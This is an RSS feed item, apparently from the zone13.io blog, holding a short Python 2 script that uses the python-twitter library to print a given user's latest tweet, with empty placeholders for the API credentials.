      <description>&lt;p&gt;This is a Python code snippet to retrieve the latest tweet from a user by making use of the Twitter developer API.&lt;/p&gt;

&lt;p&gt;The Twitter API details can be obtained from the &lt;a href=&#34;https://apps.twitter.com/&#34;&gt;developer portal&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Github &lt;a href=&#34;https://github.com/zone13/python_dev/blob/master/twitter_latest_tweet.py&#34;&gt;link&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

#Python script to retrive the latest tweet from a user
#Created by zone13.io (https://www.zone13.io)
#Version 1.0
#Usage - ./script.py &amp;lt;twitter_handle&amp;gt;
#e.g. ./script.py rihanna
#Adapted from https://github.com/bear/python-twitter
#Requirement - pip install python-twitter

import sys,twitter
api = twitter.Api()

#Populate your twitter API details below
consumer_key = &#39;&#39;
consumer_secret = &#39;&#39;
access_token_key = &#39;&#39;
access_token_secret = &#39;&#39;

api = twitter.Api(
    consumer_key=consumer_key,
    consumer_secret=consumer_secret,
    access_token_key=access_token_key,
    access_token_secret=access_token_secret
)

def user_tweet(thandle):
	statuses = api.GetUserTimeline(screen_name=thandle)
	return statuses[0].text
	
if __name__ == &amp;quot;__main__&amp;quot;:
	latest_tweet = user_tweet(sys.argv[1])
	print latest_tweet
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>